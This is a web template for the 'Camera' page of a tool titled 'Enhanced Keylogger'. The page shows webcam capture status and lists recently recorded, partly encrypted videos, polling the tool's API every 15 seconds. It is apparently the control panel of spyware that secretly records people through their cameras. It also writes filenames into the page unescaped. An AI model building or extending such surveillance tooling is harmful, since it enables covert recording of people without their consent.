{% extends "base.html" %}

{% block title %}Camera - Enhanced Keylogger{% endblock %}
{% block page_title %}Camera{% endblock %}

{% block content %}
<div class="row mb-4">
  <div class="col-lg-4">
    <div class="card h-100">
      <div class="card-header"><h6 class="m-0">Status</h6></div>
      <div class="card-body">
        <div class="d-flex align-items-center justify-content-between mb-2">
          <span class="text-muted">Enabled</span>
          <span id="camEnabled" class="badge bg-secondary">—</span>
        </div>
        <div class="d-flex align-items-center justify-content-between mb-2">
          <span class="text-muted">Running</span>
          <span id="camRunning" class="badge bg-secondary">—</span>
        </div>
        <div class="d-flex align-items-center justify-content-between mb-2">
          <span class="text-muted">Videos Recorded</span>
          <span id="camVideos" class="fw-bold">0</span>
        </div>
        <div class="d-flex align-items-center justify-content-between mb-2">
          <span class="text-muted">Encrypted</span>
          <span id="camEncrypted" class="fw-bold">0</span>
        </div>
        <div class="d-flex align-items-center justify-content-between mb-2">
          <span class="text-muted">Errors</span>
          <span id="camErrors" class="fw-bold">0</span>
        </div>
        <div class="d-flex align-items-center justify-content-between mb-2">
          <span class="text-muted">Avg Size</span>
          <span id="camAvgSize" class="fw-bold">0 B</span>
        </div>
        <div class="d-flex align-items-center justify-content-between">
          <span class="text-muted">Storage</span>
          <span id="camDir" class="small text-break">—</span>
        </div>
      </div>
    </div>
  </div>
  <div class="col-lg-8">
    <div class="card h-100">
      <div class="card-header d-flex justify-content-between align-items-center">
        <h6 class="m-0">Recent Videos</h6>
        <div>
          <label class="me-2 small text-muted">Limit</label>
          <select id="limitSelect" class="form-select form-select-sm d-inline-block" style="width: auto;">
            <option>10</option>
            <option selected>25</option>
            <option>50</option>
          </select>
        </div>
      </div>
      <div class="card-body">
        <div class="table-responsive">
          <table class="table table-sm align-middle">
            <thead>
              <tr>
                <th>Time</th>
                <th>Filename</th>
                <th>Size</th>
                <th>Encrypted</th>
                <th>Resolution</th>
                <th>Duration</th>
              </tr>
            </thead>
            <tbody id="videosTbody">
              <tr><td colspan="6" class="text-muted">Loading…</td></tr>
            </tbody>
          </table>
        </div>
      </div>
    </div>
  </div>
</div>
{% endblock %}

{% block scripts %}
<script>
function bytesToHuman(bytes){
  try{
    const units=['B','KB','MB','GB'];
    let i=0, n=Number(bytes)||0;
    while(n>=1024 && i<units.length-1){ n/=1024; i++; }
    return n.toFixed(i?1:0)+' '+units[i];
  }catch(e){return String(bytes)+' B'}
}

async function loadCameraStats(){
  try{
    const res = await fetch('/api/camera/stats');
    const data = await res.json();
    if(!data.success){ throw new Error(data.error||'Failed'); }
    const s = data.stats||{};
    document.getElementById('camEnabled').className = 'badge '+(s.enabled? 'bg-success':'bg-secondary');
    document.getElementById('camEnabled').textContent = s.enabled? 'Yes':'No';
    document.getElementById('camRunning').className = 'badge '+(s.is_running? 'bg-success':'bg-danger');
    document.getElementById('camRunning').textContent = s.is_running? 'Running':'Stopped';
    document.getElementById('camVideos').textContent = s.videos_recorded||0;
    document.getElementById('camEncrypted').textContent = s.videos_encrypted||0;
    document.getElementById('camErrors').textContent = s.errors||0;
    document.getElementById('camAvgSize').textContent = bytesToHuman(s.average_size_bytes||0);
    document.getElementById('camDir').textContent = s.video_directory||'—';
  }catch(e){ console.error(e); }
}

async function loadVideos(){
  const limit = parseInt(document.getElementById('limitSelect').value,10)||25;
  const tbody = document.getElementById('videosTbody');
  tbody.innerHTML = '<tr><td colspan="6" class="text-muted">Loading…</td></tr>';
  try{
    const res = await fetch('/api/camera/videos?limit='+encodeURIComponent(limit));
    const data = await res.json();
    if(!data.success){ throw new Error(data.error||'Failed'); }
    const vids = data.videos||[];
    if(vids.length===0){
      tbody.innerHTML = '<tr><td colspan="6" class="text-muted">No videos found.</td></tr>';
      return;
    }
    tbody.innerHTML = vids.map(v=>{
      const m = v.metadata||{};
      const ts = m.timestamp? new Date(m.timestamp*1000).toLocaleString(): '—';
      const res = Array.isArray(m.resolution)? (m.resolution[0]+'x'+m.resolution[1]) : '—';
      return `<tr>
        <td>${ts}</td>
        <td class="text-break">${v.filename}</td>
        <td>${bytesToHuman(m.file_size||0)}</td>
        <td>${m.encrypted? '<span class="badge bg-info">Yes</span>':'No'}</td>
        <td>${res}</td>
        <td>${m.duration_seconds||0}s</td>
      </tr>`;
    }).join('');
  }catch(e){
    console.error(e);
    tbody.innerHTML = '<tr><td colspan="6" class="text-danger">Failed to load videos</td></tr>';
  }
}

document.addEventListener('DOMContentLoaded', ()=>{
  loadCameraStats();
  loadVideos();
  document.getElementById('limitSelect').addEventListener('change', loadVideos);
  // auto refresh
  setInterval(()=>{ loadCameraStats(); loadVideos(); }, 15000);
});
</script>
{% endblock %}